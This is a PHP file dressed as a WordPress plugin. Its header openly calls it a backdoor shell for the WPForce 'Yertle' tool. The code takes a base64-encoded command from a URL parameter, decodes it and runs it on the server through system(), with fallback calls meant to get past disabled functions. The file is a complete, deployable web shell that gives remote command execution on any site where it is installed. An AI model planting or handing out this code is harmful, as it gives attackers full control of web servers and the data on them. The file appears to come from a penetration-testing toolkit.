<?php
    /*
    Plugin Name: Yertle Interactive Shell
    Plugin URI: https://github.com/n00py
    Description: This is a backdoor PHP shell designed to be used with the Yertle script from WPForce.
    Version: 0.1
    Author URI: https://github.com/n00py
    */

// Copied and modified from https://github.com/leonjza/wordpress-shell
$command = $_GET["cmd"];
$command = substr($command, 0, -1);
$command = base64_decode($command);

if (class_exists('ReflectionFunction')) {
   $function = new ReflectionFunction('system');
   $thingy = $function->invoke($command );

} elseif (function_exists('call_user_func_array')) {
   call_user_func_array('system', array($command));

} elseif (function_exists('call_user_func')) {
   call_user_func('system', $command);

} else {
   system($command);
}
